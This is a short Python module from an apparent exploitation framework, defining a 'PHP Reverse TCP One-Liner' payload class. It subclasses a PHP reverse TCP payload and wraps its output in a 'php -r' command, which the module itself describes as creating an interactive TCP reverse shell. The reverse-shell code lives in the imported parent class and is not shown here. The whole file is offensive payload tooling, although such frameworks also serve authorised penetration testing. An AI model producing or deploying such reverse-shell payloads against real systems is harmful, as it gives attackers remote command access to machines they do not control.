from embedxpl.core.exploit import *
from embedxpl.modules.payloads.php.reverse_tcp import Payload as PHPReverseTCP


class Payload(PHPReverseTCP):
    __info__ = {
        "name": "PHP Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using php one-liner.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
    }

    cmd = OptString("php", "PHP binary")

    def generate(self):
        self.fmt = self.cmd + ' -r "{}"'
        payload = super(Payload, self).generate()
        return payload
